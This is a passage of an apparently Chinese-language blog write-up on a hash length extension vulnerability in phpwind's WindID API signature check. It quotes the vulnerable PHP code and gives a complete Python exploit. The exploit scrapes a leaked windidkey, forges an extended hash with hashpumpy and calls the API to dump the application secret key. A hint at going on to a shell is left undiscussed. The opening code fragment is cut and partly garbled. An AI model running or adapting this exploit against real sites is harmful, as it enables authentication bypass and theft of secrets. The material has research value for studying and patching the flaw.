        $len = strlen($text)%$padlen;    
        $res = $text;    
        $span = $padlen-$len;
        for($i=0; $igetInput('windidkey', 'get');
      $_time = (int)$this->getInput('time', 'get');
      $_clientid = (int)$this->getInput('clientid', 'get');
      if (!$_time || !$_clientid) $this->output(WindidError::FAIL);
      $clent = $this->_getAppDs()->getApp($_clientid);
      if (!$clent) $this->output(WindidError::FAIL);
      if (WindidUtility::appKey($clent['id'], $_time, $clent['secretkey'], $this->getRequest()->getGet(null), $this->getRequest()->getPost()) != $_windidkey)  $this->output(WindidError::FAIL);
      $time = Pw::getTime();
      if ($time - $_time > 1200) $this->output(WindidError::TIMEOUT);
      $this->appid = $_clientid;
     }
既然都已经说了是这类型的漏洞，那我们肯定就要找能找到的hash
showFlash这里满足要求（打印出了hash 822382cb79f915c779943a1dc131f00c）
    public function showFlash($uid, $appId, $appKey, $getHtml = 1) {
    $time = Pw::getTime();
    $key = WindidUtility::appKey($appId, $time, $appKey, array('uid'=>$uid, 'type'=>'flash', 'm'=>'api', 'a'=>'doAvatar', 'c'=>'avatar'), array('uid'=>'undefined'));
    $key2 = WindidUtility::appKey($appId, $time, $appKey, array('uid'=>$uid, 'type'=>'normal', 'm'=>'api', 'a'=>'doAvatar', 'c'=>'avatar'), array());
我们再跟踪appkey
    public static function appKey($apiId, $time, $secretkey, $get, $post) {
    // 注意这里需要加上__data，因为下面的buildRequest()里加了。
    $array = array('windidkey', 'clientid', 'time', '_json', 'jcallback', 'csrf_token',
       'Filename', 'Upload', 'token', '__data');
    $str = '';
    ksort($get);
    ksort($post);
    foreach ($get AS $k=>$v) {
    if (in_array($k, $array)) continue;
    $str .=$k.$v;
    }
    foreach ($post AS $k=>$v) {
    if (in_array($k, $array)) continue;
    $str .=$k.$v;
    }
    return md5(md5($apiId.'||'.$secretkey).$time.$str);
    }
经过各种排序，我们可以得出这个hash的值和消息的结构
822382cb79f915c779943a1dc131f00c = md5（md5().$time.$str）
822382cb79f915c779943a1dc131f00c= md5 +1475841959 +
adoAvatarcavatarmapitypeflashuid2uidundefined
里面的md5值不知道，但是是32位，$time.$str都是可控，那么我们就可以拓展这个消息，得到新的hash,而调用这个函数进行验证的得地方自然也就绕过了验证
$_windidkey我们只要传入拓展后的hash即可绕过。因为我们拓展时必须保持md5 +1475841959 +
adoAvatarcavatarmapitypeflashuid2uidundefined的结构，然而排序的时候回因为传入的a(action)参数导致打乱循序，无法扩展，但是因为phpwind的路由支持post,所以post一下控制器(c)，模块(m)，动作(a)这三个参数
$_windidkey（我们拓展的hash）== md5 +1475841959 +
adoAvatarcavatarmapitypeflashuid2uidundefined +padding
+alistcappmapi(post排序的)正好绕过验证
填写一下cookie和url就可以获得secretkey（调用的list方法，要实现其他action自行修改，getshell就暂不讨论，这不是我们这里的重点
    #coding=utf-8
    import urllib
    import urllib2
    import time
    import cookielib
    import gzip
    import StringIO
    from bs4 import BeautifulSoup
    import re
    import hashpumpy
    import sys
    reload(sys)
    sys.setdefaultencoding('utf-8')
    def get_key(url):
        url = url + '/?m=profile&c=avatar&_left=avatar'
        response = opener.open(url)
        html = response.read()
        if response.info().get('Content-Encoding') == 'gzip':
            stream = StringIO.StringIO(html)
            with gzip.GzipFile(fileobj=stream) as f:
                html = f.read()
        soup = BeautifulSoup(html, 'lxml')
        key_url = soup.find('param',attrs={'name':'FlashVars'}).get('value')
        key_url = urllib.unquote(key_url)
        rule = 'uid=(.+?)&windidkey=(.+?)&time=(.+?)&clientid=(.+?)&type'
        Pattern = re.compile(rule, re.S)
        rs = re.findall(Pattern, key_url)
        return rs[0]
    def padding_exten(windidkey,time,uid):
        hexdigest = windidkey
        original_data = time+'adoAvatarcavatarmapitypeflashuid'+uid+'uidundefined'
        data_to_add = 'alistcappmapi'
        key_length = 32    
        result = list()
        rs = hashpumpy.hashpump(hexdigest,original_data,data_to_add,key_length)
        result.append(rs[0])
        tmp = str(rs)
        tmp = tmp.split(',')[1]
        tmp = tmp.split("'")[1]
        tmp = tmp.replace('\x','%')   
        rule = 'undefined(.+?)alist'
        Pattern = re.compile(rule, re.S)
        tmp = re.findall(Pattern, tmp)
        result.append(tmp[0]) 
        return result
    if __name__ == '__main__':
        url = 'http://192.168.0.100/phpwind'
        cookie = 'CNZZDATA1257835621=169451052-1472798292-null%7C1472798292; PHPSESSID=5adaadb063b4208acd574d3d044dda38; ECS[visit_times]=5; csrf_token=ab686222777d7f80; xzr_winduser=PbUcCS1OT1ZjCzY8GoJOV8EOvix9OdGpc%2BmWBPYV6ar07B7AZSOhSw%3D%3D; xzr_lastvisit=7%091475751418%09%2Fphpwind%2F%3Fm%3Dprofile%26c%3Davatar%26_left%3Davatar; xzr_visitor=cx59FPbNJ4FYG2e9cWKpUP%2FTZTef7Yu4DTFLTftwwZ%2FPEVo8'
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        opener.addheaders.append(
            ('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'))
        opener.addheaders.append(('Accept', '*/*'))
        opener.addheaders.append(('Accept-Language', 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'))
        opener.addheaders.append(('Accept-Encoding', 'gzip, deflate'))
        opener.addheaders.append(('Connection', 'keep-alive'))
        opener.addheaders.append(('Cookie', cookie))
        opener.addheaders.append(('Cache-Control', 'max-age=0'))
        uid, windidkey, time, clientid = get_key(url)
        windidkey, padding = padding_exten(windidkey,time,uid)
        payload = '/windid/index.php?time='+time+'&windidkey='+windidkey+'&clientid='+clientid+'&adoAvatarcavatarmapitypeflashuid'+uid+'uidundefined='+padding
        url = url + payload
        data = {'m':'api','c':'app','a':'list'}
        data = urllib.urlencode(data)
        response = opener.open(url,data)
        html = response.read()
        if response.info().get('Content-Encoding') == 'gzip':
            stream = StringIO.StringIO(html)
            with gzip.GzipFile(fileobj=stream) as f:
                html = f.read()
        print html
**后记**
小弟自己的理解，如果有错误的地方欢迎指正。